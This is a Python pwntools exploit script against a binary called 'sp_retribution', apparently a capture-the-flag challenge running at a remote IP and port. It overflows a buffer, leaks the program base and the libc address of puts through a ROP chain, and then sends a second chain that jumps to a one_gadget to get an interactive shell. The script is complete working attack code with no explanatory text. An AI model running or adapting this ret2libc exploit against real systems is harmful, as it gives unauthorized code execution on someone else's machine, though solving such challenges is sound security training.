import pwn
gdb = """
b *missile_launcher+200
b puts@plt
c
"""
#p = pwn.gdb.debug("./sp_retribution", gdbscript = gdb)
#p = pwn.process("./sp_retribution")
p = pwn.remote("138.68.161.126",31026)
p.recvuntil(">> ")
p.sendline("2")
p.recvuntil("Insert")
p.recvuntil("y = ")
p.sendline("")
p.recvline()
p.recvline()
leak = p.recvline()[:5]
leak = b"\x00" + leak
main_base = pwn.u64(leak.ljust(8,b"\x00")) - 0xd00
pwn.log.info("BASE: " + hex(main_base))
p.recvuntil("(y/n): ")

elf = pwn.ELF("./sp_retribution")
rop = pwn.ROP("./sp_retribution")
main = main_base + elf.symbols['main']
pwn.log.info("MAIN: " + hex(main))
junk = b"A"*5*16+b"A"*8
pop_rdi = main_base + rop.find_gadget(['pop rdi','ret']).address
puts_plt = main_base+elf.plt['puts']
puts_got = puts_plt + 0x20282a+6

pwn.log.info("POP RDI: " + hex(pop_rdi))
pwn.log.info("PUTS PLT: " + hex(puts_plt))
pwn.log.info("PUTS GOT: "+hex(puts_got))

rop_chain = junk + pwn.p64(pop_rdi) + pwn.p64(puts_got) + pwn.p64(puts_plt) + pwn.p64(main)
p.sendline(rop_chain)
p.recvline()
p.recvline()
puts_libc = p.recvline()[:6]

puts_libc = pwn.u64(puts_libc.ljust(8,b"\x00"))
pwn.log.info("PUTS LIBC: "+hex(puts_libc))
libc_base = puts_libc - elf.libc.symbols['puts']
pwn.log.info("LIBC BASE: " + hex(libc_base))

one_gadget = 0x45226 + libc_base
xor_rax = 0x0008b945 + libc_base

p.recvuntil(">> ")
p.sendline("2")
p.recvuntil("Insert")
p.recvuntil("y = ")
p.sendline("")
p.recvuntil("(y/n): ")

rop_chain = junk + pwn.p64(xor_rax) + pwn.p64(one_gadget)
p.sendline(rop_chain)

p.interactive()
